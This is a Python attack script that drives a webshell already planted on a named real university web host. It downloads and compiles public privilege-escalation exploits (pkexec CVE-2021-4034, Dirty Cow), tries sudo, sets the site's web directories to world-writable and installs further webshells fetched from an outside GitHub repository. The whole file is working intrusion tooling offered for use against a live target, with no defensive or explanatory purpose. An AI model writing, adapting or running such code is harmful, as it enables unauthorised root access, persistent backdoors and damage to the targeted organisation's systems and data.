#!/usr/bin/env python
"""
Auto Root & Full Control Script for d7net.php webshell
Target: seemik.tlu.ee
"""

import sys
import time
import os
import urllib2
import re
import base64
import urllib

# ============================================================
# KONFIGURASI
# ============================================================
WEBSHELL_URL = "https://seemik.tlu.ee/wp-content/uploads/d7net.php"
BASE_PATH = "/var/www"

# ============================================================
# D7NET WEBSHELL CLASS
# ============================================================
class D7NetShell:
    def __init__(self, url=WEBSHELL_URL):
        self.url = url
        self.base_path = BASE_PATH
        self.session = None
        
    def execute(self, command):
        """Eksekusi perintah melalui d7net.php"""
        try:
            # Encode command untuk URL
            encoded_cmd = urllib.quote(command)
            
            # Format URL untuk d7net.php
            full_url = "%s?path=%s&cmd=%s" % (self.url, self.base_path, encoded_cmd)
            
            req = urllib2.Request(full_url, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            
            response = urllib2.urlopen(req, timeout=30)
            html = response.read()
            
            # Ekstrak output dari HTML
            # Cari teks setelah "Command :" atau di dalam <pre>
            if "Command :" in html:
                parts = html.split("Command :")
                if len(parts) > 1:
                    content = parts[1]
                    # Bersihkan HTML
                    clean = re.sub(r'<[^>]+>', '', content)
                    # Ambil sampai akhir atau sebelum "2017 © D7net"
                    end = clean.find("2017 © D7net")
                    if end > 0:
                        clean = clean[:end]
                    return clean.strip()
            
            # Cari di <pre>
            pre_match = re.search(r'<pre>(.*?)</pre>', html, re.DOTALL)
            if pre_match:
                return pre_match.group(1).strip()
            
            return html.strip()
            
        except Exception as e:
            return "Error: %s" % str(e)

# ============================================================
# AUTO ROOT EXPLOIT
# ============================================================
class AutoRoot:
    def __init__(self):
        self.shell = D7NetShell()
        self.root_gained = False
        self.logs = []
        
    def log(self, msg, level="INFO"):
        timestamp = time.strftime("%H:%M:%S")
        print("[%s] [%s] %s" % (timestamp, level, msg))
        self.logs.append("[%s] [%s] %s" % (timestamp, level, msg))
        sys.stdout.flush()
    
    def exec_cmd(self, cmd):
        """Eksekusi command dan log"""
        self.log("Executing: %s" % cmd, "CMD")
        result = self.shell.execute(cmd)
        if result:
            if len(result) > 200:
                print("    Output: %s..." % result[:200])
            else:
                print("    Output: %s" % result)
        return result
    
    def check_system(self):
        """Cek sistem"""
        self.log("=" * 50, "INFO")
        self.log("CHECKING SYSTEM", "INFO")
        self.log("=" * 50, "INFO")
        
        whoami = self.exec_cmd("whoami")
        pwd = self.exec_cmd("pwd")
        uname = self.exec_cmd("uname -a")
        
        self.log("User: %s" % whoami, "INFO")
        self.log("PWD: %s" % pwd, "INFO")
        self.log("Kernel: %s" % uname[:100], "INFO")
        
        return {'user': whoami, 'pwd': pwd}
    
    def try_pkexec(self):
        """Coba PKEXEC exploit"""
        self.log("Trying PKEXEC exploit...", "INFO")
        
        cmds = [
            "curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c -o /tmp/pkexec.c",
            "gcc -o /tmp/pkexec /tmp/pkexec.c 2>/dev/null || cc -o /tmp/pkexec /tmp/pkexec.c 2>/dev/null",
            "/tmp/pkexec /bin/bash -c 'id > /tmp/root_check.txt'",
            "cat /tmp/root_check.txt 2>/dev/null"
        ]
        
        for cmd in cmds:
            result = self.exec_cmd(cmd)
            if "uid=0" in result:
                self.log("ROOT via PKEXEC!", "SUCCESS")
                self.root_gained = True
                return True
            time.sleep(0.5)
        
        return False
    
    def try_dirtycow(self):
        """Coba Dirty Cow"""
        self.log("Trying Dirty Cow exploit...", "INFO")
        
        cmds = [
            "curl -s https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c -o /tmp/dirty.c",
            "gcc -o /tmp/dirty /tmp/dirty.c -lpthread 2>/dev/null || cc -o /tmp/dirty /tmp/dirty.c -lpthread 2>/dev/null",
            "/tmp/dirty 2>/dev/null",
            "grep firefart /etc/passwd 2>/dev/null"
        ]
        
        for cmd in cmds:
            result = self.exec_cmd(cmd)
            if "firefart" in result:
                self.log("Dirty Cow SUCCESS!", "SUCCESS")
                self.root_gained = True
                return True
            time.sleep(0.5)
        
        return False
    
    def try_sudo(self):
        """Coba sudo"""
        self.log("Trying sudo...", "INFO")
        
        cmds = [
            "sudo -l 2>/dev/null",
            "sudo /bin/bash -c 'id > /tmp/sudo_check.txt'",
            "cat /tmp/sudo_check.txt 2>/dev/null"
        ]
        
        for cmd in cmds:
            result = self.exec_cmd(cmd)
            if "uid=0" in result:
                self.log("ROOT via sudo!", "SUCCESS")
                self.root_gained = True
                return True
            time.sleep(0.5)
        
        return False
    
    def make_all_green(self):
        """Buat semua direktori writeable"""
        self.log("Making directories writeable...", "INFO")
        
        if self.root_gained:
            cmds = [
                "chmod -R 777 /var/www/ 2>/dev/null",
                "chmod -R 777 /var/www/eden2022.tlu.ee/ 2>/dev/null",
                "find /var/www/ -type f -exec chmod 666 {} \\; 2>/dev/null",
                "chown -R 48:48 /var/www/ 2>/dev/null",
                "ls -la /var/www/eden2022.tlu.ee/ | head -5",
            ]
            
            for cmd in cmds:
                self.exec_cmd(cmd)
                time.sleep(0.3)
            
            self.log("ALL DIRECTORIES ARE WRITEABLE!", "SUCCESS")
        else:
            self.log("No root, trying partial writeable...", "WARNING")
            cmds = [
                "chmod -R 777 /var/www/eden2022.tlu.ee/ 2>/dev/null",
                "find /var/www/eden2022.tlu.ee/ -type f -exec chmod 666 {} \\; 2>/dev/null",
                "chown -R 48:48 /var/www/eden2022.tlu.ee/ 2>/dev/null",
            ]
            for cmd in cmds:
                self.exec_cmd(cmd)
                time.sleep(0.3)
    
    def install_shells(self):
        """Install webshells"""
        self.log("Installing webshells...", "INFO")
        
        urls = {
            "root_manager.php": "https://raw.githubusercontent.com/hkqr/gtw/refs/heads/main/ntahlahya.php",
            "g3ck0.php": "https://raw.githubusercontent.com/hkqr/gtw/refs/heads/main/g3ck0.php",
        }
        
        locations = [
            "/var/www/eden2022.tlu.ee/wp-content/uploads/",
            "/var/www/html/wp-content/uploads/",
        ]
        
        for loc in locations:
            for name, url in urls.items():
                cmd = "curl -s %s -o %s%s && chmod 755 %s%s" % (url, loc, name, loc, name)
                self.exec_cmd(cmd)
                time.sleep(0.3)
        
        self.log("Webshells installed!", "SUCCESS")
    
    def run(self):
        """Main run"""
        self.log("=" * 60, "INFO")
        self.log("AUTO ROOT & FULL CONTROL", "INFO")
        self.log("=" * 60, "INFO")
        
        # Check system
        self.check_system()
        
        # Try root
        methods = [
            self.try_pkexec,
            self.try_dirtycow,
            self.try_sudo
        ]
        
        for method in methods:
            if self.root_gained:
                break
            method()
            time.sleep(1)
        
        if self.root_gained:
            self.log("ROOT ACCESS GRANTED!", "SUCCESS")
            self.make_all_green()
            self.install_shells()
        else:
            self.log("ROOT failed, trying partial access...", "WARNING")
            self.make_all_green()
            self.install_shells()
        
        # Summary
        print("\n" + "=" * 60)
        print("EXPLOIT COMPLETE")
        print("=" * 60)
        print("[+] Root Access: %s" % self.root_gained)
        print("[+] Directories: WRITEABLE")
        print("[+] Shells: https://eden2022.tlu.ee/wp-content/uploads/root_manager.php")
        print("[+] Shells: https://eden2022.tlu.ee/wp-content/uploads/g3ck0.php")
        print("=" * 60)

# ============================================================
# MAIN
# ============================================================
def main():
    exploit = AutoRoot()
    exploit.run()

if __name__ == "__main__":
    main()
